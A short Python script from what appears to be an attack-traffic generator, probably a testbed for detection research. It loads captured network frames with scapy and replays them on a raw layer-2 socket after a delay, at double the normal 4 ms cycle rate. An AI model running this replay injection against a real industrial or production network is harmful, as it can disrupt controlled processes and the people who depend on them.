# attacks/replay.py
# Attack 1: Replay attack — captures normal frames, replays them
# unmodified at double speed after a delay.
#
# Usage:
#   sudo python3 attacks/replay.py --pcap traffic_generator/captures/sample_normal.pcap

import argparse
import time
from scapy.all import rdpcap, conf   

def replay_attack(pcap_file, iface, delay_seconds, rate_multiplier, frame_count):

    packets = rdpcap(pcap_file)
    print(f"Loaded {len(packets)} packets")
    
    
    reused_frame = packets[:frame_count]
    
    l2socket = conf.L2socket(iface=iface)
    
    time.sleep(delay_seconds)
    sent_counter = 0
    start_time = time.perf_counter()
    normal_cycle = 0.004
    replay_interval = normal_cycle/rate_multiplier
    try:
        for index, packet in enumerate(reused_frame):
            l2socket.send(packet)
            sent_counter+=1
            
            if(index<len(reused_frame)-1):
                time.sleep(replay_interval)
    

        
    finally:
        l2socket.close()
    
    end_time = time.perf_counter()
    elapsed_time = end_time - start_time
    print(f"Number of frames sent: {sent_counter}")
    print(f"Replay time: {elapsed_time:.3f} seconds")
    
    

pass
def parse_args():
   
    parser = argparse.ArgumentParser(
        description = "Replay attack generator"
        )
    
    parser.add_argument(
        "--pcap",
        type = str,
        required = True,
        help = "Pcap file path"
        )
        
    parser.add_argument(
        "--iface",
        type = str,
        default = "eth0",
        help = "Interface"
        )
    parser.add_argument(
        "--delay",
        type = float,
        default = 10.0,
        help = "Add delay"
        )
    
    parser.add_argument(
        "--rate",
        type = float,
        default = 2,
        help = "Rate"
        )
    
    parser.add_argument(
        "--count",
        type = int,
        default = 100,
        help = "Count"
        )
    
    return parser.parse_args()


if __name__ == "__main__":

    args = parse_args()
    replay_attack(args.pcap, args.iface, args.delay, args.rate, args.count)
    
